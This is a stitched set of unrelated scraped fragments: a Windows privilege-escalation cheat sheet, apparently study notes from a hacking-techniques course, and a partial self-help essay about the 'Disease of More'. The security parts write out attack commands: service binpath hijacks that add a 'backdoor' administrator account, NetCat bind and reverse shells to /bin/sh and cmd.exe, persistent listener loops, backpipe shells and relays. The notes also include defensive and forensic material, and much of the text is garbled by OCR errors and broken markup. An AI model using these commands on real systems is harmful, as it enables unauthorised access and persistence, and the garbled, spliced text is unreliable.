Suppose we found:

Vulnerable Services</h2>
<div class="level2">


Search for services that have a binary path (binpath) property which can
 be modified by non-Admin users - in that case change the binpath to 
execute a command of your own. 
<br>



Note: Windows XP shipped with several vulnerable built-in services.
<br>



Use accesschk from SysInternals to search for these vulnerable services.
<br>

<pre class="code">https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx</pre>
For Windows XP, version 5.2 of accesschk is needed:
<br>

<pre class="code">https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe</pre>
<pre class="code">accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
accesschk.exe -qdws Users C:\Windows\ </pre>
Then query the service using Windows sc:
<br>

<pre class="code">sc qc &lt;vulnerable service name&gt;</pre>
Then change the binpath to execute your own commands (restart of the service will most likely be needed):
<br>

<pre class="code">sc config &lt;vuln-service&gt; binpath= "net user backdoor backdoor123 /add" 
sc stop &lt;vuln-service&gt;
sc start &lt;vuln-service&gt;
sc config &lt;vuln-service&gt; binpath= "net localgroup Administrators backdoor /add" 
sc stop &lt;vuln-service&gt;
sc start &lt;vuln-service&gt;</pre>
Note - Might need to use the <strong>depend</strong> attribute explicitly:
<br>

<pre class="code">sc stop &lt;vuln-service&gt;
sc config &lt;vuln-service&gt; binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""

<strong>AlwaysInstallElevated</strong> is a setting that allows

<pre class="code">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

  <div class="article-content entry-content" itemprop="articleBody">504.5 - Computer &amp; Network Hacker Exploits, Part 4<br><br><br>1. App-Level Trojan Horse backdoor Suites<br>- allow for the complete control of a victim system remotely across the network.<br>- client-server architecture.<br>- very popular and many examples:<br>Poison Ivy, VNC (realvnc.com), Dameware (commercial), Sub7, Lots of others such as BlackShades and GhostRAT.<br><br>- attackers can trick victim into running tool.<br>- or attackers can install it themselves.<br>- payload option in Metasploit.<br><br>Don't fall for Scareware that your system is compromised!<br><br><br>wrappers and Packers:<br>- wrap a backdoor tool around some other application.<br>- create a Trojan Horse executable.<br>• Also known as “Binders”<br>• Example: Wrap nc.exe into an interactive birthday card<br>• Built into many backdoors (i.e., Poison Ivy)<br>• Metasploit msfvenom<br>• Can wrap into .VBS or NBA for macros in Word and Excel with exe2vba.rb and exe2vbs.rb<br>- The Veil toolkit uses some of these techniques to bypass AV!!!!<br>- SET’s default payload generation also does this<br><br><br>Windows anti-reverse engineering for Executables:<br>- For thwarting Windows reverse engineering of malicious code, attackers frequently use packers.<br>- Originally focused merely on compression of executables<br>• But, limits string searches and direct disassembly<br>— Gives attacker more obscurity<br><br>Dozens of different packing algorithms and tools<br>UPX is the most popular, available at http://upx.sourceforge.net<br>Yoda<br>Themida<br>Exe32pack<br>Many more listed at http://enwikipedia.org/wiki/Executablecornpression<br>Commercial ones as well (Thinstall, PECompact, PEBundle, etc.)<br><br>Defense: Unpacking Windows Executables<br>• To thwart these, researchers use unpackers<br>— Or, use a plug-in for a debugger<br>• Ollydbg — Very popular free Windows debugger<br>• Dozens of unpacking scripts run as plug-ins for Ollydbg at:<br>— www.openrce.org/downloads/browse/OllyDbg_OllyScripts<br>— That whole site (openrce.org) contains amazingly helpful stuff for reverse engineering malware!<br>• If a custom packing/obscuring algorithm is used, the researcher might need to create a custom unpacker using code from the malware specimen under analysis; this could take a lot of time.<br><br>- Immunity Debugger - very popular free Windows debugger.<br><br><br><br>5.3 Memory Analysis:<br>FOR MEMORY DUMPS!!!!!!!<br><br>Investigators can use several tools to analyze memory dumps from Windows machines to determine attackers’ actions, such as executing malicious<br>application-level Trojan Horse backdoors.<br>• First, you’ll need a memory dump<br>— Can be generated using a variety of utilities, including Mandiant’s Memoryze MemoryDD.bat, HBGary’s fastdump, Matthieu Suich's win32dd, winpmem, and ManTech’s mdd<br><br>• Volatile Systems’ Volatility framework<br>- Free, open source, very feature rich and useful<br>— A modular tool written in Python<br>- https://code.google.com/p/volatility<br><br>Google’s Rekall<br>— Free<br>* http://wwww.mandiant.com/products/free_software/memoryze/<br>- We focus on Rekall for analysis<br><br>- FTK<br><br><br>• Some important Rekall modules include:<br>- imageinfo: Shows the date and time the memory dump was captured<br>— netstat: Lists open sockets (PID, Port, Protocol, and when it was opened)<br>— pstree: See a full process tree for a memory image<br>— pslist: Lists running processes (PID, name, and Parent PID)<br>— dillist: Lists the DLLs loaded by a process, as well as the command-line invocation of a process<br>— netstat: Shows all active listening UDP and TCP ports and connections<br>— ifiescan: Lists the files that each process had open<br>— pedump: Dumps code associated with running process into executable file<br>— modules: Lists loaded modules from the dump, including drivers and SYS files<br><br>• Numerous other modules as well, included with Rekall, and available as<br><br>Numerous other modules are available for download and most of them are listed at the URL on the slide separate downloads:<br>— http://www.rekall-forensic.com/<br><br><br>sec504@slingshot:~$source /home/tools/rekall/bin/activate<br><br>$rekal -f /home/tools/504_memory_ex/memimage.dd<br><br><br>Rekal: Viewing Network Connections:<br>- using Rekall's 'netstat' module, we can display a list of active network connections at the time the memory dump was acquired:<br><br>• Using Rekall’s “netstat” module, we can display a list of active network connections at the time the memoiy dump was acquired:<br>[1] memimaqe.dd hh:mm:ss&gt; netstat<br>• Output is similar to the following command on a live Windows machine:<br>C:\&gt; netstat —nao | find “ESTABLISHED”<br><br><br>Viewing Processes:<br>• Rekall’s “pslist” module displays a list of running processes at the time the image was acquired<br>[1] memimagedd hh:mm:ss&gt; pslist<br><br>• Output is similar to the following command on a live Windows machine:<br>C:\&gt; wmic process get name, parentprocessid, processid<br><br><br>Rekall: DLLs and Command Line<br>Use Rekall’s “dilhist” module to display a list of DLLs loaded by a process, as well as the commandline invocation of a running process:<br>[1] memimage.dd hh:mm:ss&gt; dlllist pid=[pid_num]<br><br>Output is similar to the following commands on a live Windows machine:<br>:\&gt; tasklist /m /fi “pid eq [pid]”<br>C:\&gt; wmic process where processid=[pid] get commandline<br><br><br>c:\nc.exe -n 192.168.49.145 6000 -e c:\ncrelay.bat<br><br>For the list of DLLs loaded by every running process, we can use the following:<br>C:\&gt; tasklist /m<br>For the list of DLLs loaded by a specific process, we can execute the following:<br>C:\&gt; tasklist /m /fi “pid eq [pid]”<br><br><br>Lab: Windows Attack:<br><br>Using Rekall to analyze the image in /home/tools/504_memory_ex/memimage.dd, determine what the attacker was doing on the compromised system by answering the following questions:<br>1. Which processes are communicating with other machines on the network?<br>2. Which processes did the attacker likely run?<br>3. Is the attacker using the machine to pivot, and if so, how, and to which other systems is he/she pivoting?<br>4. Which suspicious process seems to be the root of all other suspicious activity on the compromised system?<br>5. Which builtin windows commands would you use if you were doing the same analysis on a live Windows system instead of a memory dump file?<br><br><br>:Hint: first Populate This Connection Table - Lab: Windows Attack<br>As a hint, you might find it useful to start by populating the Connection Table provided in the slide.

The attacker configures the Ptunnel client to listen on a given TCP port on the localhost interface of the client machine. In addition, the attacker must configure the Ptunnel proxy, which runs on an external machine, accessible via ping packets from the Ptunnel client. <br>Finally, the attacker configures the Ptunnel client with a given ultimate destination address. That destination machine can provide any TCP-based service, including HTTP or Secure Shell. Note that the Ptunnel client software is configured with this destination address, which it tells to the Ptunnel proxy for each packet that it sends.<br>The attacker then runs some TCP-based client program on the attacker’s machine, directing it to connect to the localhost interface on the TCP port where the Ptunnel client is listening. The Ptunnel client takes the TCP packets, encapsulates them in ICMP Echo packets, and forwards the resulting packets to the Ptunnel proxy.<br>From a network perspective, only ping packets (with the TCP packet as the payload) are being sent. The Ptunnel proxy then de-encapsulates the TCP packet and forwards it to its ultimate destination simply using TCP. Likewise, the Ptunnel proxy encapsulates any responses that come back from that destination into ICMP Echo Reply packets, forwarding them back to the client.<br>The Ptunnel proxy can be configured to authenticate the Ptunnel client, using an MD5-based challenge/response authentication algorithm. Currently, Ptunnel does not support encryption. However, if the application using the TCP-based connection encrypts the data (such as HTTPS or SSH), the attacker would have some degree of protection of the data.<br><br><br>Covert Channels in TCP and IP Headers:<br><br>- why not just create a covert channel using extra space in the TCP or IP header?<br>- Covert_TCP is one tool that implements a covert channel using either the TCP or IP header.<br><br>Extending the Ideas of Covert_TCP:<br>• Transfer Trojan Horse backdoor commands or shell instead ofjust files<br>• Bi-direcfional bounce attack<br>• Use other fields in the TCP, IP, and ICMP headers<br>— Reserved space<br>— IP options<br>— ICMP message type<br><br>Other Covert Channels:<br>• Just about any protocol can be used as a covert channel<br>•DNS<br>— DNSCat2 by Ron Bowes and numerous other maiware specimens<br>• Quick UDP Internet Connection (QUICK)<br>— Use of multiplexed UDP connections for connections<br>• Stream Control Transmission Protocol (SCTP)<br>— Also uses multi-streaming to send data across multiple concurrent connections<br>— Supports multihoming so multiple endpoints can be used as failover<br>— Yeah, this means it has built-in C2 server failover<br>• The goal of attackers using odd protocols for transfer is to find new areas where existing signatures do not exist<br>• Also, there are some issues with reassembly across multiple concurrent streams of data being sent.<br><br><br>Gcat:<br>Full C2 backdoor where all Command and Control traffic flows over Gmail.<br>• Originally created by Ben Donnelly of BHIS<br>• Currently maintained by byt3bl33d3r<br>• Supports:<br>— Command execution<br>— Screenshots<br>— Download and upload of files<br>— Keylogging<br>- Execution of sheilcode<br>• Bypasses many DLP/ID$/IPS systems<br>• Many IDS/IPS/Firewalls are not monitoring Gmail traffic very well<br>• https://github.com/byt3bl33d3r/gcat<br><br>Covert Channel Defenses (I):<br>• Preparation<br>— Keep attackers off system in the first place<br>• Identification<br>— Know what processes should be running on your systems<br>• When a strange process starts running, investigate<br>• Especially if it has admin/root privileges<br>— Network-based IDS can analyze packets for:<br>• Shell commands in HTTP (for reverse www shell)<br>• Unusual data in ICMP messages (for ICMP tunnels)<br>— false positives associated with network management equipment<br>• Unusual changes in IP ID and Seq/Ack fields (for Covert_TCP) — pretty hard to do.<br><br><br>Lab: Covert Channels:<br><br>Plain Sight Covert Channels<br>• Not all backdoors use plaintext to transmit data<br>• Many use other protocols<br>— HTfP8<br>- IPSEC<br>- DNS<br>• Others hide in plain sight<br>— For example, HTTP<br><br>• Every custom web application has data and fields that are encoded and transmitted differently<br>- For example, session parameters, hidden form elements, etc.<br>• It is almost impossible for full inspection of all these different variables<br>• Let’s take a look at a backdoor that uses this technique<br>• It also beacons at 30-second intervals<br>- a very common technique for modern malware.<br><br><br><br>VSAgent (I):<br>• Custom backdoor written by the Black Hills Information Security team<br>— Special 504 version wntten by Luke Baggett<br>• Encodes all Command and Control (C2) in base64<br>• Then, inserls it into a WEW$TATE parameter<br>• The encoded data is sent in the clear<br>• Very difficult to detect<br><br>If, for any reason, you need to remove results from a previous session please feel free to run the following command and restart vsagent:<br>#rm /opt/course_www/SEC5O4/vsagent-504/data.db<br><br><br>VSAgent (II):<br>rootslingshot# python /home/sec56e/CourseFiles/vsagent-504/vsagent-504.py http://127.O.,O.1/SEC5O4/vsagent—504/vssvc.php<br><br><br>Open another prompt and<br>sec504@slingshot:~$ firefox http://192.168.159.131/SEC504/vsagent-504/vsgui.php<br><br>Now, we will use Firefox to connect to the web UI for VSAgent.<br><br><br>#tcpdump -i lo -s0 -A host 127.0.0.1 | grep VIEWSTATE<br><br><br>Challenge!<br>Lab: Covert Channels<br>• Run some commands and decode the data<br>• Hints:<br>— The data is base64 encoded<br>— There are characters that are hex-encoded characters (Le., linefeed, =, etc.). which can pollute the decoding of the base64 data<br>• The offending characters will need to be removed or converted!<br>• awk gsub is your friend!<br>— $ echo cat dog dog | awk ‘{gsub(/cat/,”dog”)}1’<br>— Will output dog dog dog<br>• Base64 --decode will decode the data<br>• It should look something like this:<br>— $ echo &lt;paste your string here&gt; | &lt;awk command here&gt; | &lt;Base64 decode here&gt;<br>• But, there is more than one path!<br>— Ruby!

In a network we find a user ID and try different passwords to logon.<br><br>Password-Guessing Alternative: Password Spraying<br><br>- to avoid triggering account lockout, attackers sometimes attempt an alternative form of password guessing called password spraying.

For the uninitiated, worms are automated attack tools that spread via networks. A worm hits one machine, takes it over, and uses it as a staging ground to scan for and conquer other vulnerable systems. When these new targets are under the worm’s control, the voracious spread continues as the worm jumps off these new victims to search for additional prey. Using this process, worms propagate across a network on an exponential basis.<br><br>To date, most worms have had only one or two exploits built in: Witty, Sasser, Code Red, Slapper and such.<br>Ramen had 3 exploits (buffer overflow).

  <div class="article-content entry-content" itemprop="articleBody">504.3 - Computer &amp; Network Hacker Exploits, Part 2<br><br>Here we will talk about systems attacks and exploitation!<br><br>Physical Access Attacks<br>Many attacks focus on having direct access to a system.<br>Think stolen laptop.<br>There are some great tools to bypass local access controls like passwords and hard drive encryption.<br><br>Kon-boot<br>USB boot attack where any password is accepted as a correct password.<br><br>Inception<br>Unlocking a powered on and locked computer via DMA firewire/Thunderbolt connections.<br>Great for gainin access to systems with hard drive encryption.<br><br>LanTurtle+Responder<br>USB attack where a malicious USB ethernet adapter causes a system to generate DNS requests and Responder can capture hashes.<br><br>Rubber Duckies - are Human Interface Devices (HID) and they look like mass storage, but are actually an automatic keyboard, which types really fast and can take over a computer.<br>They can download and execute malware, they can steal files, they can brute force pins on some phones.<br>http://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe.<br><br>Physical Access Defense<br>Use full-disk encryption:<br>This will also require you to train users to completely power down systems when not using them.<br><br>Restrict access to USB ports:<br>Can be tough, too many USB devices for legitimate reasons.<br>Train users to lock systems when not using them (will restrict Rubber Duckie Attacks).<br><br>Password Protect BIOS, and disable USB boot:<br>Will stop Kon-boot attacks.<br><br>Disable LLMNR:<br>Will disable LanTurtle + Responder attacks.<br><br><br>BGP hijacking:<br><br>Border Gateway Protocol allows routers on the Internet to route traffic to the correct places.<br>Autonomous System Numbers (ASNs) define which IP addresses a router is responsible for.<br>If there is an overlaptop between two ASN ranges, routers will route to the more specific ASN.<br>An attacker who either has compromised an ISP or can inject routes (think nation-states) can broadcast malicious routes and reroute traffic through their network.<br>A number of suspected attacks over the years.<br>Unfortunately, they are hard to detect and look very similar to router misconfiguration issues.<br><br>For this to work, you need to be an ISP!<br><br>BGP Hijacking Defense:<br>Know what normal traceroute information looks like.<br>http://www.traceroute.org<br><br>This can be difficult as routes can change. However, it migth be suspicious if all your traffic is being routed around the world for no good reason.<br>Train your users to identify potentially hijacked sessions. You will get Browser errors, and dropped connections.<br>Be ready to contact your ISP.<br><br><br><br>Multi-purpose NetCat:<br><br>It read and writes data across the network.<br>There are different versions of NetCat, such as:<br>- the traditional NetCat<br>- Gnu NetCat<br>- Ncat (that comes with Nmap at installation)<br>- DnsCat (netcat functionality over DNS) (skullsecurity.org/wiki/index.php/Dnscat)<br>- SoCat (dest-unreach.org/socat/): generic relay of data across data channels, with SSL, raw IP and more.<br>- Cryptcat (sourceforge.net/projects/cryptcat): encrypting NetCat<br>- LinkCat (dankaminsky.com/category/security): NetCat functionality in raw Ethernet frames.<br><br>Many times, NetCat and its cousins (some with a few modifications) are not caught by antivirus software!<br><br>Netcat Client Mode:<br>- client mode initiates a connection to a specific port.<br>- standard input is sent across the network (keyboard, redirected from a file or piped from an application).<br>- all data back from the network is put on standard output<br>- messages from the tool itself are sent to standard err<br>- supports source routing, which is useful for spoofing<br><br><br>NetCat Listen Mode:<br>- listen mode awaits for connections on a specific port<br>- all data received from the network is put on standard output, screen, redirected to a file or sent to an application<br>- standard input is sent across network<br>- messages from the tool itself are sent to stadard err<br>- mirror image of the previous slide's picture; the only difference is clients initiate connections and listeners wait for them to arrive.<br><br><br><br>Essential NetCat Command Switches:<br>nc [options] [target-system] [remote-port(s)]<br><br>-l = listen mode (default is client)<br>-L = listen harder (Windows only); makes netcat a persistent listener<br>-u = UDP mode (default is TCP)<br>-p = local port (in server mode, this is port listened on; in client mode, this is source port)<br>-e = program to execute after connect (useful for backdoors)<br>-z = zero I/O mode (useful for scanning)<br>-wN = timeout for connects, waits for N seconds (useful for scanning)<br>-v = verbose (print when a connection is made)<br><br>Don't forget standard shell redirects!<br>&gt; : Dump output to a file<br>&lt; : dump input from a file<br>| : pipe output of first program into second program<br><br>Some NetCat uses<br>- we discuess some of the many uses of NetCat<br>1) Data transfer (moving giles)<br>2) Port scanning and vulnerability scanning<br>3) Making connections to open ports<br>4) Backdoors<br>5) Relays<br><br>Netcat - Data Transfer<br>option 1) To move a file from listener back to client<br>Listener: nc -l -p port &lt; filename<br>client: nc listenerIP port &gt; filename<br><br>Option 2) To push a file from client to listener<br>listener: nc -l -p port &gt; filename<br>client: nc listenerIP port &lt; filename<br><br>You can even use some browsers as the client for option 1.<br>Works with TCP and UDP.<br>You can even setup source IP address on listener so that it only accepts connections from one source address.<br>Similar functionality to a TCP wrapper.<br><br>Netcat - Port and Vuln Scanning<br>TCP and UDP port scanning<br>Linear scans (default) or random scans (with the -r option)<br>-z option for minimal data to be sent<br><br># nc -v -w3 -z targetIP startport - endport<br><br>-v tells us when a connection is made, which is crucial for a port scanner.<br>-w3 means wait no more than 3 seconds on each port.<br><br>Can scan for any source port and source routing supported.<br>We can connect to various ports, enter data, and record the response. Nessus and other commercial scanners do that.<br>Netcat ships with some helpful vulnerability-scanning scripts!<br>Weak RPCs, NFS exports, weak trust relationships, guessable passwords and FTP vulnerabilities.<br><br>Making Connections to Open Ports<br>Why not just use Telnet? Because we just DON'T hate ourselves! :)<br><br>Netcat is faster than a Telnet client.<br>Easier to drop a connection (Ctrl+C) with Netcat than with a Telnet client (which often hangs).<br>Some binary data is interpreted as Telnet options characters; Netcat handles raw data well.<br>Telnet clients plop their commentary messages in the standard output stream; Netcat does not.<br>Telnet doesn't support UDP, but Netcat does!!!!<br><br><br>Netcat - Backdoors:<br>Get a login prompt (or other backdoor) at any port, TCP or UDP.<br>Unix: nc -l -l port -e /bin/sh<br>windows: nc -l -p port -e cmd.exe<br><br>Use Netcat in client mode to connect to backdoor listener:<br>nc listenerIP portNumber<br><br>You are logged in as the user that ran Netcat!<br>All Linux system have netcat installed by default, as an administration tool!<br><br>Netcat - Persistent Backdoor Listeners<br>- with the -l flag, Netcat listens once. When a connection is dropped, Netcat stops listening.<br>- in Windows, Netcat re-starts listening when invoked with the -L flag.<br>- On Linux/Unix, Netcat can be made persistent in several ways: schedule a cron job to start Netcat regularly, use a version of Netcat that supports '-L', and<br>- use a while look as below:<br>$while[1]; do echo "Started"; nc -l -p [port] -e /bin/sh; done<br><br>Put that into a shell script called listener.sh, chmod it to readable and executable, and use the nohup command to log out and keep it going.<br><br>$nohup ./listener.sh &amp;<br><br>More Netcat Backdoors - Reverse Shells<br>You can even 'push' session from client to listener. This is sometimes called 'shoveling shell'.<br>listener: <br>nc -l -p port<br>Client:<br>nc listenerIP port -e /bin/bash<br><br>Then, type commands at the listener.<br>The network thinks the connection is outgoing Telnet, HTTP, whatever... It's really an incoming interactive shell.<br><br>Netcat - Relays<br>Netcat can be configured to relay information from machine to machine to machine. Redirect data through ports allowed by firewall.<br>Or use relays to make it harder to trace true originating point of an attack.<br>Rather trivial, but setup Netcat in listener mode and pipe its output through another client-mode instance of Netcat.<br><br><br>Methods for Making Netcat Relays<br>- the batch file approach, which works well on Windows<br>- on Windows, create a file called ncrelay.bat containing "nc next_hop 54321"<br>- to implement a relay, type 'nc -l -p 11111 -e ncrelay.bat'<br>- the -e options can be followed by only one argument, so use bat file.<br><br>Format:<br>nc -1 —p incoming port no target server oufgoinq port<br><br>Example:<br>no -l —p 1111 | nc edserver 54321<br><br>The backpipe approach, which works well on Linux and Unix:<br>mknod backpipe p<br>nc -l -l 11111 0&lt;backpipe | nc next_hop 54321 1&gt;backpipe<br><br>What's a backpipe?<br>Everything in Linux is a file. We can create special files in Linux, with the mknod command. We called the file backpipe!<br><br>I can use this technique to use a FIFO device file in memory to transfer files between systems. It's like a hidden path way to transfer files!<br><br><br>Using the Relay idea for a Netcat Backdoor Without -e:<br><br>Let's get back to the idea of Netcat backdoors, adapting the redirects of the relay idea to compensate for the lack of -e support in may versions of Netcat.<br><br><br><br>Remember that a lot of Netcat versions are compiled to omit -e support!<br><br>Suppose you have a version of Netcat that is compiled without the -e option. How can you make a backdoor?<br>We can make a relay, but we relay from bash to Netcat.<br><br>$ mknod backpipe p<br>$ /bin/bash 0&lt;backpipe | nc -l -p 8080 1&gt;backpipe<br><br>Functionally, that is the rough equivalent of 'nc -l -p 8080 -e /bin/bash', but it doesn't require the -e option! The backpipe is looping infinitely, but the breakpoint is YOU!<br><br><br>Netcat - Defense<br>The defense against Netcat depends on the mode in which it is used.<br>To summarize, preparation step involves.<br>- data transfer : know what is running on the systems.<br>- port scanner: close all unused ports<br>- vulnerability scanner: apply system patches<br>- connecting to open ports: close all unused ports<br>- backdoors: know what is running on your systems<br>- relays: carefully architect your network with layered security so an attacker cannot relay around your critical-filtering capabilities.<br>Intranet firewalls can help create chokepoints for filtering.<br>Private VLANs (PVLANs) can also help restrict the flow of traffic between systems.<br><br>NetCat Labs:<br>We do several labs with Netcat between Windows and Linux:<br>0) Create sender and listener for a simple chat.<br>1) Pull a file from Windows to Linux<br>2) Push a file from Linux to Windows<br>3) Create Linux backdoor listener<br>4) Create backdoor reverse shell from Windows to Linux<br>5) Create a Linux Netcat relay.<br><br><br>Let's make sure Linux and Windows are ready to go:<br>#ifconfig eth0 10.10.75.1/16<br>#iptables -F<br><br>Windows:<br>netsh firewall set opmode disable<br>netsh advfirewall set allprofiles state off.<br><br><br>NetCat on Windows<br>Remember!

All payloads can be exported in many different formats (macros, executables (Windows, Linux and mobile devices), web components, raw C, Perl and Ruby code).<br><br><br>The Meterpreter doesn't create separate process (no extraneous cmd.exe), doesn't touch hard drive unless you want it to, doesn't need any system-provided command executables for its command shell; they are built-in to the Meterpreter, easily extendable by adding new DLLs. Meterpreter originally released for Windows targets, PHP Meterpreter has been released for website targets, meterpreters for Linux, Android and Java also included.<br><br>Includes these features: display system-related information, interact with the file system (cd, ls, upload, download, etc), interact with the network (display network config, build port relay), interact with processes on the target (execute: run a process), Kill (terminate one or more processes), PS (list processes)), meterpreter communications utilize TLS (encrypts them, which makes them more difficult to detect).<br><br>MultiSession support for multiple targets. In-memory process migration. Disabling keyboard and mouse input, keystroke logging from within the Meterpreter, snigging from withing the Meterpreter, multiple encoders for exploit and payload for IDS evasion, pivoting to use one compromised system to attack other machines, priv modules for altering all NTFS timestamps and dumping SAM database for cracking (extendable to include local privilege escalation attacks in the future), GPS and WebCam capabilities.<br><br><br>MsfelfScan and MsfPeScan: search executables and libraries for machine language elements that could be a sign of vulnerabilities.<br><br><br>Many features already built in simplify development. More than a thousand example exploits to learn and copy from. After an exploit is developed in the framework, it can use any payload already in the framework. If you develop in the framework, your exploit can be popped right into the Metasploit engine.<br><br>Buffer Overflow Defense - Preparation:<br>At a minimum, keep your systems patched.<br>vendors frequently release patches for various programs that have buffer overflows.

When getting permission it needs to be in writing! Verbal agreement don't hold up too well in court! The documented permission should also state that the giver of permission understand there may be 'adverse' side-effects of the scanning or testing activity! This is also a 'Get Out of Jail Free' document!<br>Sample at:<br>http://www.counterhack.net/permission_memo.html<br><br>Attack tools are getting easier to use and more easily distributed!<br>High-quality, extremely functional attack tools!<br>Risk of the antidisclosure movement!<br><br>How to make money on malicious code:<br>- sell the code for backdoors/bots<br>- spam and web-based advertising<br>- pump and dump stock schemes<br>- phishing: email, phone and targeted (spear) phishing<br>- denial of service extortion (not just porn and gambling sites as targets anymore)<br>- keystroke loggers stealing financial information<br>- rent out armies of infected systems for all of the above<br>- RAM scrapers pulling CC numbers of POS terminals<br><br>Hack into web and file-sharing sites and alter software to include backdoors.<br>Everyone who downloads and uses the tool is impacted!<br>More than 60 software packages in total whose Internet updates can be subverted this way!<br><br>The marriage of general attack tools and worms, viruses, and bots is resulting in powerful techniques.<br>Worms are increasingly being used to carry bots, backdoors, password crackers and scanners.<br>Botnets are growing large with self-replicating code.<br>Several active botnets with more than 1 million hots.<br>Attacks from multiple sources simultaneously.<br>Bottom line: it's a good time to be an attacker, or a security practitioner (defender).<br><br>Reconnaissance is 'casing the joint'!<br>Two types of attackers: script kiddies, and attackers out to get a particular site.<br><br>DNS:<br>You need to give out postal address, phone numbers, names of points of contacts, authoritative domain name server, in order to register a domain name. This information can be used in social engineering, war dialing, war driving, scanning!<br><br>Whois:<br>Lookup the registrar at:<br>www.internic.net/whois.html<br><br>- go to the registrat's whois database to get detailed records:<br>www.networksolutions.com/whois/index.jsp<br><br>DNS zone Transfer:<br>tcpdimp -nn port 53 and host 10.10.10.45<br><br>or:<br>c:\&gt;nslookup<br>server [DNSServer]<br>set type=any<br>ls -d [domain]<br><br>UDP port 53: general queries<br>TCP port 53: zone transfers<br><br>S = syn packet!<br><br>Or use 'dig':<br>$ dig @[DNS-server-ip] [target-domain] -t AXFR<br><br>DNS Recon Defenses:<br>- do not allow zone transfers from just any system<br>- use split DNS<br>- make sure your DNS servers are hardened<br><br>Look for zone transfers (in DNS server logs or data transferred to/from TCP port 53).<br><br>Search the target's own websites:<br>Press releases, white papers, design documents, sample deliverables, open positions, key people, contacts, search related sites (business partners, ISP, suppliers).<br><br>http://www.sec.gov/edgar.html<br>https://namechk.com<br>www.pipl.com<br>https://connect.data.com<br>Newspapers, blogs, and magazines.<br>Social networking sites (what expertise, which friends/associates), newsgroups with postings from employees.<br>Pushpin by Tim Tomes (part of Recon-ng).<br>Social-media geolocation (Flicker, Twitter, Picasa). Simply provide a latitude, longtitude, and radius (in kilometers) and pushpin pulls all available social-media posts from that area. Can map targets to behavior patterns (when and where they have lunch, their religious and political leanings), it can even be used to gather internal pictures of secured locations (people love to take pictures of their office and badges).<br><br>Look for web spider/crawler activity! Logs show systematic access of entire website, page by page. That could simply be the Google bot or another search engine. Someone just sucked down the entire contents of our site!<br>Remember to use Google Dorks to search for information!<br><br>Useful Search Directives:<br>"site:" directive to search within the given domain<br>site:www.counterhack.net<br><br>"link:" directive to show all sites linked to a given site<br>"intitle:" directive shows whose title matches the search criteria<br>"inurl:" directive shows pages whose URL matches the search criteria<br>"relative:" directive shows similar pages (sometimes useful, sometimes not)<br>"info:" directive finds cached pages, related pages, pages that link to it, pages that containt the term (NOt USEFUL)<br>example:<br>site:sans.org -www -isc -ics -labs -login -owncloud -survey<br><br><br><br>Surround literals with " ", as in "Soc Sec Num"<br>Add minus (-) to a search term to maximize effectiveness of resulting hits.<br>Search for airline status. Search for VIN for vehicle information. Search for UPC number for product info.<br><br>Google's Cache and Wayback machine. <br>This can be useful if information was pulled from a website, maybe by an incident response team. Useful for bad guys if IR containment isn't thorough.Browse the Google Cache (HTML is loaded from Google, any images on site are loaded from original site, also, any links browsed take you to the real site, not a good approach for anonymous surfing, still, it's useful for finding recently removed pages).<br><br><br>Search for specific file types on a target domain.<br>Look for active content:.asp, .jsp, .php, .bak or .cgi.<br>Excel spreadsheets: search for .xls and view it as HTML.<br>For example, search for:<br>site:www.[target].com asp<br>Filetype: is also useful, but also just try the suffix.<br><br>Search Engine Recon: FOCA<br>- many files have metadata (usernames, vulnerable software versions of software, directory paths) that can be useful for attackers.<br>- FOCA automates the process of searching for various files, downloading them, and extracting their metadata.<br>- in addition to metadata extraction, is has basic Google Hacking Database and basic web-vulnerability scanning.<br><br>Example: you can download someone's file from the web server, email it to them in macro's embedded, and tell them to correct gramatical errors and mispells.

This can be configured to use TCP packets or ignored all together (the -PN flag in Nmap, formerly -Po).<br>Nmap sends the following 4 packets to each address in the target range: ICMP echo request, TCP SYN to port 443, TCP ACK to port 80, ECMP Timestamp request. Nmap is running with UID 0; when running without UID 0, Nmap sends SYN to port 80 instead of ACK.<br>Traceroute sends packets with small TTL values.<br>IPV4 TTL and IPv6 Hop Limit is the number of hops the packets should go before being discarded.<br>Based on the source address of the TTL-exceeded message, you can determine the router for given hop.<br>The scanning system increments TTL for each packet to determine each router hop.<br><br>Defending Against Network Mapping:<br>Preparation:<br>You could disable incoming ICMP echo request messages.

You may configure a router to allow in only established connections (for example, connections with ACK control bit set). Allow outgoing SYNs, allow incoming connections only if ACK control bit is set.<br>This blocks session initiations from the outside.<br>But an attacker can conduct ACK scan to get past some filters.<br>ACK scans are useful for mapping, but not for port scanning.<br>Great for finding sensitive internal systems port exploitation.<br><br>OS Fingerprinting<br>Attempts to determine the OS of target by sending various packet types and measuring the response.<br>Concept originated with the tool QueSO.<br><br>Keeping track of all SYN and SYN/ACKS is hard.<br>MassScan and other tools like it separate out the SYNs and the SYN/ACKs.

<span>S</span>uccess is often the first step toward disaster. The idea of progress is often the enemy of actual progress.</section>I recently met a guy who, despite having a massively successful business, an awesome lifestyle, a <a href="https://markmanson.net/healthy-relationships">happy relationship</a>,
 and a great network of friends, told me with a straight face, that he 
was thinking of hiring a coach to help him “reach the next level.”<br>
When
 I asked him what this elusive next level was, he said he wasn’t sure, 
that that’s why he needed a coach, to point out his blind spots and show
 him what he’s missing out on.<br>
“Oh,” I said. And then stood there 
awkwardly for a moment, gauging how brutally honest I was willing to be 
with someone I just met. This guy was very enthusiastic, clearly ready 
to spend a lot of money on whatever problem someone decided to tell him 
he had.<br>
“But what if there’s nothing to fix?” I said.<br>
“What do you mean?” he asked.<br>
“What
 if there is no ‘next level?’ What if it’s just an idea you made up in 
your head? What if you’re already there and not only are you not 
recognizing it, but by constantly pursuing something more, you’re 
preventing yourself from appreciating it and enjoying where you are 
now?”<br>
He bristled a bit at my questions. Finally, he said, “I just feel like I <a href="https://markmanson.net/prove-yourself">need to always be improving myself</a>, no matter what.”<br>
“And that, my friend, might actually <a href="https://markmanson.net/stop-trying-to-be-happy">be the problem</a>.”<br>
There’s
 a famous concept in sports known as the “Disease of More.” It was 
originally coined by Pat Riley, a hall of fame coach who has led six 
teams to NBA championships (and won one as a player himself).<br>
Riley
 said that the Disease of More explains why teams who win championships 
are often ultimately dethroned, not by other, better teams, but by 
